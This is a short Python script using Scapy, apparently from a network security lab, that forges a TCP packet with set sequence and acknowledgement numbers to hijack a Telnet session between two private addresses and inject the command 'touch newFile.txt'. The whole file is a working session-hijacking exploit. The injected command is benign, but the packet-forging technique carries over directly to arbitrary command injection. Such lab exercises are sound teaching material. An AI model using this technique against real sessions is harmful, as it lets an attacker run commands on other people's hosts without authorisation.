from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=50108, dport=23, flags="A", seq=3499570294, ack=185700684)
data = "\rtouch newFile.txt\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

# See the ManualSessionHijacking.pcapng file for the attack example.